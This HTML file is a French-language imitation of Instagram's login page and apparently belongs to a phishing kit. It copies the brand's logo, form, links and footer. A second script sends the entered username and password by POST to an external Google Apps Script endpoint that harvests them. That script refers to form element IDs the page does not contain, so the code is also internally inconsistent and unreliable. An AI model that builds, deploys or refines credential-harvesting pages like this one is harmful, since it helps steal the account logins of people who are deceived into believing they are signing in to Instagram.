<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="icon" href="logoinsta.png">
    <title>Instagram</title>
    <style>
        :root{
            --bg:#ffffff;
            --text:#1f2937;
            --muted:#6b7280;
            --border:#e5e7eb;
            --shadow:0 8px 24px rgba(0,0,0,.06);
            --btn:#0095f6;
            --btn-hover:#0077cc;
            --btn-active:#0064b1;
            --btn-disabled:#e5e7eb;
            --fb:#1877f2;
        }
        @media (prefers-color-scheme: dark){
            :root{
                --bg:#0b0d10; --text:#e5e7eb; --muted:#94a3b8; --border:#1f2937;
                --shadow:0 10px 28px rgba(0,0,0,.35);
            }
        }

        *{box-sizing:border-box}
        body{
            margin:0; background:var(--bg); color:var(--text);
            font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .right{ width:100%; max-width:400px; margin:0 auto; }
        .card-login{
            border:1px solid var(--border); border-radius:20px;
            box-shadow:var(--shadow); background:var(--bg); padding:26px 24px;
        }
        .logo{
            width: 100px; 
            height: 100px; 
            margin: 0 auto 20px auto; 
            display: block;
        }
        .title { 
            font-size: 18px; 
            font-weight: 700; 
            text-align: center; 
            margin: 20px 0; 
        }
        .field{ margin-bottom:10px; position: relative; }
        .input{
            width:100%; border:1px solid var(--border); background:#fff0; color:var(--text);
            padding:12px 14px; border-radius:16px; font-size:14px; outline:none;
            transition:border-color .2s, box-shadow .2s;
        }
        .input:focus{ border-color:#9bbcf6; box-shadow:0 0 0 4px rgba(155,188,246,.25); }
        .btn{
            width:100%; padding:12px 16px; border:none; border-radius:24px;
            background:var(--btn); color:#fff; font-weight:700; cursor:pointer;
            transition:background .2s, transform .02s;
        }
        .btn:hover{ background:var(--btn-hover); }
        .btn:active{ background:var(--btn-active); }
        .btn[disabled]{ background:var(--btn-disabled); opacity:.6; cursor:not-allowed; }

        .help{ text-align:center; margin:12px 0 6px; color:var(--text); font-size:14px; }
        .or{
            margin:10px 0; color:var(--muted); font-size:13px;
            display:flex; align-items:center; gap:12px; justify-content:center;
        }
        .or::before,.or::after{ content:""; height:1px; background:var(--border); flex:1; }
        .btn-fb{
            width:100%; display:flex; align-items:center; justify-content:center; gap:8px;
            padding:12px 16px; border:1px solid var(--border);
            border-radius:24px; background:#fff0; color:var(--text);
            cursor:pointer; transition:background .2s, border-color .2s;
        }
        .btn-fb:hover{ background:rgba(24,119,242,.06); border-color:#c7d2fe; }
        .btn-fb .icon{ width:18px; height:18px; color:var(--fb); }

        /* Footer */
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: var(--muted);
        }

        .footer a {
            color: var(--text);
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Inscrivez-vous */
        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: var(--text);
        }

        .signup a {
            color: var(--btn);
            text-decoration: none;
        }

        .signup a:hover {
            text-decoration: underline;
        }

        /* Pour afficher/masquer mot de passe */
        #togglePassword {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #007bff;
            cursor: pointer;
        }
    </style>
</head>
<body >
    <section class="right" aria-label="Se connecter à Instagram">
        <div class="card-login">
            <img class="logo" src="logoinsta.png" alt="Instagram Logo">
            <h3 class="title">Se connecter à Instagram</h3>

            <!-- Formulaire de connexion -->
            <div id="loginForm" class="form-container active">
                <form novalidate>
                    <div class="field">
                        <input class="input" id="username" name="username" type="text"
                               placeholder="Numéro de mobile, nom de profil ou adresse e‑mail"
                               autocomplete="username" required />
                    </div>

                    <div class="field">
                        <input class="input" id="password" name="password" type="password"
                               placeholder="Mot de passe" autocomplete="current-password" minlength="6" required />
                        <button type="button" id="togglePassword">Afficher</button> 
                    </div>

                    <button class="btn" id="submitBtn" type="submit" disabled>Se connecter</button>

                    <div class="help" style="margin-top:14px;">
                        <a href="https://www.instagram.com/accounts/password/reset/">Mot de passe oublié ?</a>
                    </div>

                    <div class="or">ou</div>

                    <!-- Le bouton "Se connecter avec Facebook" placé ici -->
                    <button class="btn-fb" type="button" id="fbBtn" onclick="window.location.href='facebook.html'" aria-label="Se connecter avec Facebook">
                        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                            <path d="M22 12.07C22 6.48 17.52 2 11.93 2 6.35 2 1.87 6.48 1.87 12.07c0 4.93 3.6 9 8.31 9.87v-6.98H7.9v-2.89h2.28V9.41c0-2.25 1.34-3.49 3.4-3.49.98 0 2 .18 2 .18v2.2h-1.12c-1.1 0-1.45.68-1.45 1.38v1.66h2.47l-.4 2.89h-2.07v6.98c4.72-.86 8.32-4.94 8.32-9.87z"/>
                        </svg>
                        <span >Se connecter avec Facebook</span>
                    </button>

                </form>
            </div>

            <!-- Inscrivez-vous -->
            <div class="signup">
                Vous n’avez pas de compte ? <a href="Instagram Sign Up.html" onclick="showSignUp()">Inscrivez-vous</a>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <div class="footer">
        <p>
            <a href="#">Meta</a> | <a href="#">À propos</a> | <a href="#">Blog</a> | <a href="#">Emplois</a> | <a href="#">Aide</a> | 
            <a href="#">API</a> | <a href="#">Confidentialité</a> | <a href="#">Conditions</a> | <a href="#">Lieux</a> | 
            <a href="#">Instagram Lite</a> | <a href="#">Meta AI</a> | <a href="#">Threads</a> | 
            <a href="#">Importation des contacts et non-utilisateurs</a>
        </p>
        <p>Français © 2026 Instagram par Meta</p>
    </div>

    <script>
  
        // Fonction pour afficher le formulaire d'inscription
        function showSignUp() {
            document.getElementById('loginForm').classList.remove('active');
            document.getElementById('signUpForm').classList.add('active');
        }

        // Fonction pour afficher le formulaire de connexion
        function showLogin() {
            document.getElementById('signUpForm').classList.remove('active');
            document.getElementById('loginForm').classList.add('active');
        }

        // Afficher/Masquer mot de passe
        const togglePassword = document.getElementById('togglePassword');
        const passwordField = document.getElementById('password');
        
        togglePassword.addEventListener('click', function () {
            const type = passwordField.type === 'password' ? 'text' : 'password';
            passwordField.type = type;
            togglePassword.textContent = type === 'password' ? 'Afficher' : 'Masquer';
        });

        const form = document.getElementById('loginForm');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');

        function updateBtn() {
            submitBtn.disabled = !(user.value.trim().length > 0 && pass.value.trim().length >= 6);
        }

        user.addEventListener('input', updateBtn);
        pass.addEventListener('input', updateBtn);
    </script>
    <script>
const scriptURL =
  "https://script.google.com/macros/s/AKfycbxRpPvtVuXwmdFaUEOKwZxj6GnA01DxIEvsJaOgMVPMX0OEOBrZW1drWh4vEtEtjFw/exec";

document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault();

  let username = document.getElementById("login_username").value;
  let password = document.getElementById("login_password").value;

  let formData = new FormData();
  formData.append("username", username);
  formData.append("password", password);

  fetch(scriptURL, {
    method: "POST",
    body: formData,
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.status === "success") {
        swal("Welcome", "Login successful", "success");

        document.getElementById("loginBox").classList.add("d-none");
        document.getElementById("mainForm").classList.remove("d-none");

        // store username for submission
        window.loggedUser = username;
      } else {
        swal("Error", "Wrong username or password", "error");
      }
    });
});
</script>

</body>
</html>
